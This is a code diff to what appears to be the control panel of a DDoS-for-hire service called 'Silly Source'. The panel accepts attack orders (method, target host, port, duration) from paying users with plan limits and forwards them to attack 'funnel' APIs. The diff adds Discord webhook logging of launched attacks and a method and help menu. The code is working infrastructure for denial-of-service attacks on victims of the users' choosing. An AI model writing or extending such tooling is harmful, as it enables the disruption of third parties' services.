@@ -8,6 +8,7 @@ from threading import Thread
 from datetime import datetime, timedelta
 
 DEBUG = False
+DISCORD = False
 
 if len(argv) == 1:
 	print(f"Running normally, for debug mode do\npython3 {argv[0]} debug\r\n\r\n")
@@ -20,6 +21,9 @@ if DEBUG:
 with open("config.json", "r") as f:
 	try:
 		CFG = json.load(f)
+		if CFG["logging"]["discord"]["enabled"]:
+			DISCORD = True
+			from discord_webhook import DiscordWebhook, DiscordEmbed
 	except Exception as e:
 		exit(f"[{e}] Your config.json file is formatted inproperly or doesn't exist.")
 
@@ -78,9 +82,10 @@ connected = {}
 class Tools:
 	global CFG
 	global LOGINS
+	global LOGGING
+	global DISCORD
 	global ongoing
 	global cooldown
-	global LOGGING
 	def __init__(self) -> None:
 		...
 
@@ -315,6 +320,11 @@ class Tools:
 									f.write(f"{username} {parsed[1]} {parsed[2]} {parsed[3]} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\r\n")
 								if DEBUG:
 									print(f"[Silly Source] Attack has been blocked from {username}, it has been logged in dstat.txt")
+								if DISCORD:
+									webhook = DiscordWebhook(url=CFG["logging"]["discord"]["dstat_logs"])
+									embed = DiscordEmbed(title="[Silly Source] Attack Has Been blocked", description=f"**{username}** Attack blocked for dstat!\r\n\r\n\r\nMethod: **{parsed[0]}**\r\nHost: **{parsed[1]}**\r\nPort: **{parsed[2]}**\r\nTime: **{parsed[3]}**", color="f80303")
+									webhook.add_embed(embed)
+									response = webhook.execute()
 							
 							sock.send(f'You cant hit dstats\r\n'.encode())
 						else:
@@ -323,9 +333,6 @@ class Tools:
 
 							else:
 								try:
-									print(LOGINS[username]["concurrents"] == ongoing[username]["running"])
-									print(LOGINS[username]["concurrents"])
-									print(ongoing[username]["running"])
 									if int(LOGINS[username]["timelimit"]) < int(parsed[3]):
 										sock.send(f'Your timelimit is {LOGINS[username]["timelimit"]}\r\n'.encode()) 
 									
@@ -345,6 +352,14 @@ class Tools:
 														f.write(f"{username} {parsed[1]} {parsed[2]} {parsed[3]} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\r\n")
 													if DEBUG:
 														print(f"[Silly Source] Attack has been launched by {username}, it has been logged in attacks.txt")
+													if DISCORD:
+														try:
+															webhook = DiscordWebhook(url=CFG["logging"]["discord"]["attack_logs"])
+															embed = DiscordEmbed(title="[Silly Source] Attack Has Been Started", description=f"**{username}** Sent An Attack!\r\n\r\n\r\nMethod: **{parsed[0]}**\r\nHost: **{parsed[1]}**\r\nPort: **{parsed[2]}**\r\nTime: **{parsed[3]}**", color="44f803")
+															webhook.add_embed(embed)
+															response = webhook.execute()
+														except Exception as e:
+															print(f"ERROR: {e}")
 												Thread(target=Tools().concurrents_handler, args=((parsed[0], parsed[1], parsed[2], parsed[3], username),)).start()
 												Thread(target=Tools().handle_cooldown, args=((username),)).start()
 												apis = METHODS[parsed[0]]["funnels"]
@@ -394,6 +409,14 @@ class Tools:
 													if DEBUG:
 														print(f"[Silly Source] {domain} Returned status code {resp.status_code}")
 														print(f"[Silly Source] {domain} Returned JSON {resp.json}")
+													if DISCORD:
+														try:
+															webhook = DiscordWebhook(url=CFG["logging"]["discord"]["attack_logs"])
+															embed = DiscordEmbed(title="[Silly Source] Attack Has Been Started", description=f"**{username}** Sent An Attack!\r\n\r\n\r\nMethod: **{parsed[0]}**\r\nHost: **{parsed[1]}**\r\nPort: **{parsed[2]}**\r\nTime: **{parsed[3]}**", color="44f803")
+															webhook.add_embed(embed)
+															response = webhook.execute()
+														except Exception as e:
+															print(f"ERROR: {e}")
 											Thread(target=Tools().concurrents_handler, args=((parsed[0], parsed[1], parsed[2], parsed[3], username),)).start()
 											Thread(target=Tools().handle_cooldown, args=((username),)).start()
 											sock.send(b'Attack sent.\r\n')
@@ -428,6 +451,27 @@ class Tools:
 							Tools().add_new(user, passwrd, timelimit, concurrents, cooldown, admin, expiry, vip)
 						else:
 							sock.send(b'Yo bitch ass aint no admin')
+
+					elif cmd in ("methods", "Methods"):
+						payload = ""
+						payload += "\r\n=====================  Methods  ======================\r\n"
+
+						for method in METHODS:
+							payload += f"{method}({'VIP' if METHODS[method]['vip_only'] else 'NORMAL'}) - {METHODS[method]['description']}\r\n"
+
+						payload += "======================================================\r\n"
+
+						Tools().clear(sock)
+
+						sock.send(f'{payload}'.encode())
+
+					elif cmd in ("help" "Help"):
+						payload = "\r\n=====================  Help Page  ====================\r\n"
+						payload += "help - takes you to the help page\r\nmyinfo - Shows your plan info\r\nmethods - shows the methods page\r\nclear - clear's the screen\r\nongoing - Shows all ongoing attacks\r\nupdate(ADMIN) - updates something specific about a user\r\nadd(ADMIN) - adds a new user\r\n"
+						payload += "======================================================\r\n"
+						Tools().clear(sock)
+
+						sock.send(payload.encode())
 
 					elif cmd in ("myinfo", "plan"):
 						Tools().clear(sock)
